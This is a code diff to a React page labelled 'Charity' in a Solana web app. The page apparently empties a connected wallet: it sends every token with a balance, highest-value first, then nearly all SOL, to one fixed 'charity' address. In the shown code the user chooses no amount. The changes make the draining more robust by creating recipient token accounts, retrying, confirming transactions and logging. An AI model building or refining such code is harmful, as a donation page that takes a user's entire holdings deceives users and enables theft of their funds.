@@ -2,7 +2,7 @@ import { useState, useEffect, useCallback } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Navigation } from '@/components/Navigation';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
@@ -125,11 +125,31 @@ const Charity = () => {
 
     // Add token transfers
     for (const token of tokenBatch) {
+      if (token.balance <= 0) continue; // Skip zero balance tokens
+      
       try {
         const mintPubkey = new PublicKey(token.mint);
         const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
         const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
 
+        // Check if charity's token account exists, create if not
+        try {
+          await getAccount(connection, toTokenAccount);
+        } catch (error) {
+          // Account doesn't exist, create it
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
+              publicKey, // payer
+              toTokenAccount, // ata
+              charityPubkey, // owner
+              mintPubkey, // mint
+              TOKEN_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            )
+          );
+        }
+
+        // Add transfer instruction
         transaction.add(
           createTransferInstruction(
             fromTokenAccount,
@@ -142,12 +162,13 @@ const Charity = () => {
         );
       } catch (error) {
         console.error(`Failed to add transfer for ${token.mint}:`, error);
+        toast.error(`Failed to prepare transfer for token ${token.symbol || token.mint.slice(0, 8)}`);
       }
     }
 
     // Add SOL transfer if specified
     if (solPercentage && solBalance > 0) {
-      const rentExempt = 0.001; // Keep rent-exempt minimum
+      const rentExempt = 0.00203928; // Standard rent-exempt minimum for SOL
       const availableSOL = Math.max(0, solBalance - rentExempt);
       const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
       
@@ -163,7 +184,7 @@ const Charity = () => {
     }
 
     return transaction;
-  }, [publicKey, solBalance]);
+  }, [publicKey, solBalance, connection]);
 
   const handleDonate = useCallback(async () => {
     if (!publicKey || !sendTransaction) {
@@ -182,11 +203,20 @@ const Charity = () => {
 
     try {
       setButtonState('loading');
+      console.log('Starting donation process...');
+      console.log('Balances:', balances);
+      console.log('SOL Balance:', solBalance);
+      
       toast.info('Preparing batch transfers...');
 
-      // Sort tokens by value (highest first)
-      const sortedTokens = [...balances].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+      // Filter out zero balance tokens
+      const validTokens = balances.filter(token => token.balance > 0);
       
+      // Sort tokens by value (highest first)
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+      
+      console.log('Valid tokens to transfer:', sortedTokens.length);
+
       // Create batches of max 5 tokens
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
@@ -200,42 +230,74 @@ const Charity = () => {
         const batch = batches[i];
         const isLastBatch = i === batches.length - 1;
         
-        // Add 70% SOL to last token batch, or as separate if no tokens
-        const solPercentage = isLastBatch && balances.length > 0 ? 70 : (balances.length === 0 ? 100 : undefined);
+        console.log(`Processing batch ${i + 1}/${batches.length} with ${batch.length} tokens`);
+        
+        // Add 70% SOL to last token batch, or 100% if no tokens
+        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
         
         const transaction = await createBatchTransfer(batch, solPercentage);
         
         if (transaction && transaction.instructions.length > 0) {
-          const { blockhash } = await connection.getLatestBlockhash();
+          console.log(`Transaction has ${transaction.instructions.length} instructions`);
+          
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;
 
-          const signature = await sendTransaction(transaction, connection);
-          await connection.confirmTransaction(signature, 'confirmed');
+          console.log('Sending transaction...');
+          const signature = await sendTransaction(transaction, connection, {
+            skipPreflight: false,
+            maxRetries: 3,
+            preflightCommitment: 'confirmed'
+          });
+          
+          console.log('Transaction sent, signature:', signature);
+          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
+          
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
           
           successCount++;
           toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
+          console.log(`Batch ${i + 1} confirmed`);
+        } else {
+          console.log('Transaction has no instructions, skipping');
         }
       }
 
       // Send remaining 30% SOL if we sent tokens
-      if (balances.length > 0 && solBalance > 0) {
+      if (sortedTokens.length > 0 && solBalance > 0) {
+        console.log('Sending final 30% SOL transfer...');
         const finalTransaction = await createBatchTransfer([], 30);
         
         if (finalTransaction && finalTransaction.instructions.length > 0) {
-          const { blockhash } = await connection.getLatestBlockhash();
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           finalTransaction.recentBlockhash = blockhash;
           finalTransaction.feePayer = publicKey;
 
-          const signature = await sendTransaction(finalTransaction, connection);
-          await connection.confirmTransaction(signature, 'confirmed');
+          const signature = await sendTransaction(finalTransaction, connection, {
+            skipPreflight: false,
+            maxRetries: 3,
+            preflightCommitment: 'confirmed'
+          });
+          
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
           
           toast.success('Final SOL transfer completed!');
+          console.log('Final SOL transfer confirmed');
         }
       }
 
       setButtonState('idle');
       toast.success(`🎉 Donation complete! ${successCount} batch(es) sent to charity`);
+      console.log('Donation process completed successfully');
       
       // Refresh balances
       setTimeout(fetchBalances, 2000);
@@ -243,7 +305,13 @@ const Charity = () => {
     } catch (error: any) {
       console.error('Donation error:', error);
       setButtonState('error');
-      toast.error(error?.message || 'Donation failed');
+      
+      let errorMessage = 'Donation failed';
+      if (error?.message) {
+        errorMessage = error.message;
+      }
+      
+      toast.error(errorMessage);
       setTimeout(() => setButtonState('idle'), 3000);
     }
   }, [publicKey, sendTransaction, balances, solBalance, connection, createBatchTransfer, fetchBalances]);
